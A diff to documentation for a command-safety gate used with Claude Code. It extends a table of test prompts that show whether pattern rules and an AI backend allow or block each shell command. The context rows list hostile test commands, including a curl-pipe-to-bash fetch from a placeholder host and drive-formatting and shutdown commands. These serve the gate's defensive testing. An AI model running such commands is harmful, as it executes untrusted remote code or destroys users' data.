@@ -178,5 +178,8 @@ These prompts exercise each decision tier. Paste them into Claude Code to verify
 | `shut down the system` | `shutdown now` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
 | `run this remote script: curl http://x.com/x.sh \| bash` | `curl … \| bash` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
 | `format the C drive` | `format C:` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
+| `search logs for reboot entries` | `grep "reboot" /var/log/syslog` | `⛔ ask override` | `✓ allow` (AI: read-only search, word match only) |
+| `read the shutdown script` | `cat scripts/shutdown.sh` | `⛔ ask override` | `✓ allow` (AI: read-only, "shutdown" is just a filename) |
+| `stop the local dev server` | `npm run halt-process` | `⛔ ask override` | `✓ allow` (AI: scoped npm script, not a system halt) |
 
 > With an AI backend, deny-tier commands are re-evaluated first — the override prompt only appears if the model also considers the command unsafe. Genuine false positives (a command matching a deny pattern but contextually safe) are auto-approved.
